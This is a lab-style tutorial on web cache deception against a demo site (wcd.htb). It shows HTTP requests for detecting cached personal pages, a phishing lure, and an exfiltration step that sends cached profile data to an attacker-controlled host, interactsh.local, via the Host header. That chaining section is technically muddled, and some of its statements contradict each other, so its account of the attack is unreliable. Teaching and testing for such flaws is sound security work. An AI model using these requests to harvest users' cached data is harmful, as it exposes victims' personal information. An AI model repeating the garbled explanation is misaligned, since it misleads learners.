# Web Cache Deception

Web cache deception (WCD) is an attack where an attacker lures a victim to a specific URL on a legitimate web application, causing the web cache to cache the victim's personalized content on a publicly accessible URL. This allows the attacker to retrieve the victim's sensitive content by accessing the publicly cached URL. This is especially dangerous since web caches might store cookies and session tokens and serve them to an attacker. This attack is often combined with host header attacks as we will see in the following.

## Identification

To identify a potential web cache deception vulnerability, we need to find an endpoint on the vulnerable web application that reflects parts of the URL path in the response. Consider a web application that stores sensitive content and has a web cache in front of the web server. When we access the URL `/profile/user.css`, it serves the personalized profile page but with a `Content-Type: text/css` header:

```http
GET /profile/user.css HTTP/1.1
Host: wcd.htb
Cookie: PHPSESSID=...
```
HTTP GET request to /profile/user.css on wcd.htb with a session cookie. Response with Content-Type text/css, displaying personalized content: "Hello htb-stdnt, welcome back to your personalized profile! Your e-mail address is htb-stdnt@wcd.htb."

We can see that when we access the URL `/profile/user.css`, we receive the personalized profile page but with the `Content-Type` header set to `text/css`. The web application serves a valid CSS file if we access the URL `/profile/user.css` directly. However, if we access the URL `/profile` (without the `.css` extension), it serves the same personalized page but with the correct `Content-Type` header `text/html`. This discrepancy is what we will exploit.

Now we have to check how the web cache handles this. Let's access the URL `/profile/user.css` once again and check the `X-Cache-Status` header in the response. If it says `MISS`, the cache has not been poisoned. Then, send the same request again to ensure that it says `HIT`:

```http
GET /profile/user.css HTTP/1.1
Host: wcd.htb
Cookie: PHPSESSID=...
```
HTTP GET request to /profile/user.css on wcd.htb with a session cookie. Response with X-Cache-Status HIT, Content-Type text/css, displaying personalized content.

Afterward, access the URL `/profile/user.css` from a different account or an unauthenticated session. You should receive the personalized content of the previous user (the victim) even though you are not logged in as them:

```http
GET /profile/user.css HTTP/1.1
Host: wcd.htb
```
HTTP GET request to /profile/user.css on wcd.htb without a session cookie. Response with X-Cache-Status HIT, Content-Type text/css, displaying personalized content of the previous user.

This indicates that the web cache cached the personalized response for `/profile/user.css` and serves it to other users. This is a web cache deception vulnerability. The issue occurs because the web server serves the personalized page for a URL that ends with `.css`, but the web cache sees `.css` and assumes it's a static resource that can be cached and served to all users.

## Exploitation

To fully exploit web cache deception, we need to lure a victim to the vulnerable URL `/profile/user.css`. This is easily achieved by sending a phishing email. When the victim clicks the link, their personalized content is cached on the publicly accessible URL. The attacker can then retrieve the victim's content by simply accessing the same URL.

In our lab, the web application and the web cache are only accessible via the internal network. Therefore, we cannot directly access the cached content by visiting `/profile/user.css`. However, web cache deception can be chained with a host header attack to exfiltrate the cached content. If the web application is also vulnerable to host header attacks, we can change the host header to a domain that we control. When the victim accesses the URL `/profile/user.css`, the web cache caches the content with the malicious host header. The attacker can then access the cached content on their own domain:

```http
GET /profile/user.css HTTP/1.1
Host: interactsh.local
Cookie: PHPSESSID=...
```

When we access `/log` on `interactsh.local`, we can see the cached content for `/profile/user.css`. This contains the victim's sensitive personalized information, which includes their email address, which can then be used to enumerate other services or reset their password.

```http
GET /log HTTP/1.1
Host: interactsh.local
```
HTTP GET request to /log on interactsh.local. Response includes the cached personalized content: "Hello htb-stdnt, welcome back to your personalized profile! Your e-mail address is htb-stdnt@wcd.htb."

## Prevention

To prevent web cache deception, web applications should not serve personalized content for URLs that end with a static file extension (e.g., `.css`, `.js`, `.png`). Additionally, web caches should be configured to only cache truly static resources. If personalized content must be served from a URL with a static file extension, the `Cache-Control: no-store` header should be used to prevent caching of that specific response. Another robust prevention mechanism is to strip file extensions from requests before they reach the web server, ensuring that personalized content is always handled as dynamic, non-cacheable data.

